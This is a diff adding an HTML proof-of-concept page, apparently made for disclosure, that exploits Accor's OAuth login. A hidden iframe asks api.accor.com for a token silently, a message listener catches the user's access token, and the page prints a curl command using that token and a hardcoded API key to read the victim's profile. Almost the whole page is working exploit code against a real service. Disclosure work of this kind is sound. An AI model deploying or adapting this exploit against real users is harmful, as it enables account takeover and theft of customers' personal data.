@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<script>
+function log(...args) {
+    console.log('[PoC]', ...args)
+}
+function onmsg(e) {
+    const token = e.data?.token;
+    alert (Received access token:', token)
+    log('Received access token:', token);
+    log('Attacker could now run, for example:');
+    log(`curl 'https://api.accor.com/customer/v1/contacts/me' -H 'Apikey: l7xx8785261b2a33457db88959a8679a1307' -H 'Authorization: Bearer ${token}'`);
+}
+addEventListener("message", onmsg);
+</script>
+</head>
+<body>
+<iframe hidden src="https://api.accor.com/authentication/v2.0/authorization?appId=all.accor&prompt=none&redirect_uri=https%3A%2F%2Fall.accor.com%2Fauthentication%2Flanding%2Findex.shtml"></iframe>
+</body>
+</html>
